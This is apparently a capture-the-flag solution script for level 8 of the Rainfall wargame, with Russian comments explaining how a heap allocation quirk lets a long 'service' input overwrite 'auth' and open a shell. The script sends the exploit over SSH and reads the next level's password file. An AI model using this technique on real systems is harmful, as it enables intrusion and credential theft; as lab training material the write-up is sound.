# 1. Запустить программу в дебаггере
# 2. Найти глобальные переменные auth и service
# 3. Дизассемблировать main, посмотреть как работает программа
# 4. Программа считывает ввод и проверяет его на наличие разных команд, сохраняет их в буфер
# 5. Команды auth и service выделяют память для ввода и копируют его туда, команда service использует strdup
# 6. Шелл открывается, если что-то записано в памяти после сохранённого auth
# 7. Если записать длинную строку при помощи команды service, strdup перепишет auth
# 8. Запустить программу, передать команды: auth с любой строкой, service с длинной строкой, login, забрать пароль

ssh level8@"$RAINFALL_IP" -p 4242 '
    COMMANDS="auth me\n""service start\n""service buffer overflow here\n""login\n"
    ((echo -e $COMMANDS && cat) | ./level8) <<< "cat /home/user/level9/.pass"
'
